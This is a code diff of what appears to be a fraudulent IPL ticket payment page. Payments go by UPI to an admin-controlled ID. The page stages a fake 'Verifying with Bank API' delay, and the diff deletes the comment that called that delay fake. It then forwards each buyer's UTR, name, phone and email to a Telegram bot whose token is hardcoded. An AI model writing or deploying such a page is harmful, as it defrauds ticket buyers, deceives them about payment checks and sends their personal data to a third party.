@@ -60,7 +60,7 @@
         .qr-container { position: relative; width: 220px; height: 220px; margin: 0 auto; border-radius: 16px; border: 2px solid #e2e8f0; padding: 10px; background: #fff; box-shadow: 0 10px 25px rgba(0,0,0,0.05); overflow: hidden; display: none;}
         #qr-code { width: 100%; height: 100%; object-fit: contain; border-radius: 8px; }
 
-        /* 🔥 UTILITY BUTTONS CSS 🔥 */
+        /* Utility Buttons */
         .qr-actions { margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;}
         .btn-action { background: #f1f5f9; color: #475569; border: 1px solid #e2e8f0; padding: 10px 16px; border-radius: 50px; font-size: 13px; font-weight: 700; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 6px; outline: none;}
         .btn-action:hover { background: #e2e8f0; color: #1e293b; }
@@ -68,6 +68,7 @@
         .btn-action svg { width: 16px; height: 16px; }
         .btn-primary { background: #0052FF; color: white; border-color: #0052FF; }
         .btn-primary:hover { background: #0036b3; color: white; }
+        .visible-upi-box { display:none; margin-top:15px; padding:10px; background:#f1f5f9; border:1px dashed #cbd5e1; border-radius:8px; }
 
         /* Trust Logos */
         .trust-logos { margin-top: 20px; display: flex; justify-content: center; align-items: center; gap: 18px; }
@@ -141,7 +142,10 @@
                 <img id="qr-code" src="" alt="UPI QR">
             </div>
 
-            <p id="visible-upi" style="display:none; font-size:14px; font-weight:700; color:#0f172a; margin-top:12px; background:#f1f5f9; padding:8px; border-radius:8px; border:1px dashed #cbd5e1;"></p>
+            <div id="visible-upi-box" class="visible-upi-box">
+                <span style="font-size:12px; color:#64748b;">Pay to UPI ID:</span><br>
+                <strong id="visible-upi-text" style="font-size:15px; color:#0f172a; letter-spacing:1px;"></strong>
+            </div>
 
             <div class="qr-actions" id="qr-actions-box">
                 <button class="btn-action" onclick="downloadQR()">
@@ -168,7 +172,6 @@
                 <input type="number" id="utr" class="floating-input" placeholder=" " oninput="checkInputs()">
                 <label class="floating-label">Enter Bank UTR / Reference No.</label>
             </div>
-            
             <div id="utr-error" class="error-msg">
                 <svg width="14" height="14" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
                 Invalid Bank UTR! Please check again.
@@ -178,7 +181,6 @@
                 <input type="number" id="paid-amt" class="floating-input" placeholder=" " oninput="checkInputs()">
                 <label class="floating-label">Enter Exact Amount Paid (₹)</label>
             </div>
-
             <div id="amt-error" class="error-msg">
                 <svg width="14" height="14" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
                 Amount mismatch! Please enter the exact amount shown above.
@@ -218,7 +220,7 @@
         }, 1000);
 
         // --- ORDER SUMMARY LOGIC ---
-        const finalPrice = localStorage.getItem('finalPrice') || 0;
+        const finalPrice = parseFloat(localStorage.getItem('finalPrice')) || 0;
         const matchTitle = JSON.parse(localStorage.getItem('selectedMatch'))?.title || "IPL Match Ticket";
         
         document.getElementById('p-amt').innerText = "₹" + finalPrice;
@@ -237,15 +239,14 @@
             }
         }
 
-        // --- 🔥 COPY UPI LOGIC (Directly copies from variable) 🔥 ---
-        window.adminUpiId = ""; // Ye Firebase set karega
+        // --- 🔥 COPY & SAVE UTILITIES (Direct from Admin Firebase) 🔥 ---
+        window.adminUpiId = ""; 
 
         function copyUPI() {
             if (!window.adminUpiId || window.adminUpiId === "") {
                 alert("UPI ID not found. Please wait for it to load.");
                 return;
             }
-            
             navigator.clipboard.writeText(window.adminUpiId).then(() => {
                 const msgEl = document.getElementById('upi-copied-msg');
                 msgEl.style.display = 'block';
@@ -264,7 +265,7 @@
             document.body.removeChild(a);
         }
 
-        // --- SECURE VALIDATION LOGIC ---
+        // --- VALIDATION LOGIC FOR UTR AND EXACT AMOUNT ---
         function checkInputs() {
             const utrVal = document.getElementById('utr').value;
             const amtVal = document.getElementById('paid-amt').value;
@@ -273,16 +274,14 @@
             const utrInput = document.getElementById('utr');
             const amtInput = document.getElementById('paid-amt');
 
-            // Reset errors visually
             document.getElementById('utr-error').style.display = 'none';
             document.getElementById('amt-error').style.display = 'none';
             utrInput.style.borderColor = '#0052FF';
             
-            // Only make amount box blue if user is typing
             if(amtVal.length > 0) amtInput.style.borderColor = '#0052FF';
             else amtInput.style.borderColor = '#e2e8f0';
 
-            // Button is enabled only if BOTH fields have data
+            // Button active ONLY if BOTH fields have data
             if(utrVal.length > 5 && amtVal.length > 0) {
                 btn.disabled = false;
                 btn.classList.add('active');
@@ -298,7 +297,6 @@
             
             const errorMsgUtr = document.getElementById('utr-error');
             const errorMsgAmt = document.getElementById('amt-error');
-            
             const utrInput = document.getElementById('utr');
             const amtInput = document.getElementById('paid-amt');
             
@@ -306,18 +304,18 @@
             const btnLoader = document.getElementById('btn-loader');
             const btnText = document.getElementById('btn-text');
 
-            // 🔥 1. Check if UTR is Fake
+            // 1. Check UTR
             let isUtrFake = false;
             if(val.length !== 12) isUtrFake = true;
             else if(val.startsWith('0')) isUtrFake = true;
             else if(/^(\d)\1{11}$/.test(val)) isUtrFake = true;
             else if(val === '123456789012' || val === '098765432109' || val === '123451234512') isUtrFake = true;
 
-            // 🔥 2. Check if Amount matches Exactly
+            // 2. Check Exact Amount
             let isAmtFake = false;
-            if(enteredAmt != finalPrice) isAmtFake = true;
+            if(parseFloat(enteredAmt) !== parseFloat(finalPrice)) isAmtFake = true;
 
-            // Display Errors
+            // Show Errors if Any
             if(isUtrFake) {
                 errorMsgUtr.style.display = 'flex';
                 utrInput.style.borderColor = '#ef4444';
@@ -327,19 +325,17 @@
                 amtInput.style.borderColor = '#ef4444';
             } 
             else {
-                // ALL GOOD - PROCEED!
+                // SUCCESS FLOW
                 errorMsgUtr.style.display = 'none';
                 errorMsgAmt.style.display = 'none';
                 localStorage.setItem('userUTR', val); 
 
-                // ⏳ FAKE API DELAY
                 btn.classList.remove('active');
                 btn.classList.add('loading');
                 btnText.innerText = "Verifying with Bank API...";
                 btnLoader.style.display = "block";
 
                 setTimeout(() => {
-                    // --- ✈️ TELEGRAM UTR ALERT ---
                     const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
                     const chatId = "6820660513"; 
                     
@@ -355,4 +351,4 @@
                                         `👤 *Name:* ${name}%0A` +
                                         `📞 *Phone:* ${phone}%0A` +
                                         `📧 *Email:* ${email}%0A` +
-           
+                            
